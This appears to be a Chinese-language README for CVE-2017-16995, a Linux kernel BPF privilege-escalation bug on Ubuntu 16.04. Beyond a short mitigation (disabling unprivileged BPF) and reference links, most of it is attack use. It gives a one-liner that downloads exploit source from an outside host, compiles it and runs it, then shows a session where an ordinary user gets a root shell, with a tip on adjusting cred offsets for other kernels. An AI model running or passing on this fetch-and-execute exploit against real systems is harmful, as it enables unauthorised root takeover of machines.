# Ubuntu16.04-0day

### 漏洞范围： all 4.4 ubuntu aws instances are vulnerable
#### Jann Horn发现在某些情况下，Linux内核中的Berkeley Packet Filter（BPF）实现不正确地执行了符号扩展check_alu_op()。本地攻击者可以使用它来导致拒绝服务（系统崩溃）或可能执行任意代码。（CVE-2017-16995）

<jannh@google.com>

#### 前提条件：unprivileged_bpf_disabled sysctl未设置
#### CVE 编号： CVE-2017-16995
### 漏洞测试环境
```

➜  ~ id

uid=1002(test) gid=1002(test) groups=1002(test)

➜  ~ lsb_release -a                  

Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.3 LTS
Release:	16.04
Codename:	xenial

➜  ~ uname -a

Linux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

➜  ~ 

```
### 参考解决方案
``
非特权用户可以使用此漏洞在系统上升级其权限。

设置参数“kernel.unprivileged_bpf_disabled = 1”通过限制对bpf（2）调用的访问来防止这种特权升级
___________________________________________________________________________________________________________________________

root@Ubuntu# echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled

______________________________________________________________________________________________________________________________


```

[![asciicast](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW.png)](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW)


## Use-Age:

```

wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 

```

### upstream44.c

```

sha256sum b71b2317c2f2461f0c25a650c9c6a4dd2399e5d7f800ec19822ba720a574030d

sha1sum d91b5dd8b074dd33bbb6994ab21af4e6279c9098

md5sum f38c046a22fd85e3aab3aa7ea4ef21a4

```

![](./0day.jpg)

```
$ id
uid=1002(test) gid=1002(test) groups=1002(test)

$ wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned
--2018-03-16 17:08:09--  http://cyseclabs.com/exploits/upstream44.c
Resolving cyseclabs.com (cyseclabs.com)... 58.96.20.9
Connecting to cyseclabs.com (cyseclabs.com)|58.96.20.9|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5776 (5.6K) [application/octet-stream]
Saving to: ‘/tmp/upstream44.c.1’

upstream44.c.1                                       100%[==========================================================================>]   5.64k  --.-KB/s    in 0s
2018-03-16 17:08:10 (186 MB/s) - ‘/tmp/upstream44.c.1’ saved [5776/5776]

task_struct = ffff880065821980
uidptr = ffff880034edbe04
spawning root shell

root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0

```
#### 注意 如果不同的内核调整CRED偏移量+检查内核堆栈大小



### 参考链接

https://access.redhat.com/security/cve/cve-2017-16995

https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f

https://security-tracker.debian.org/tracker/CVE-2017-16995

https://usn.ubuntu.com/3523-2/

https://www.securityfocus.com/bid/102288

https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f



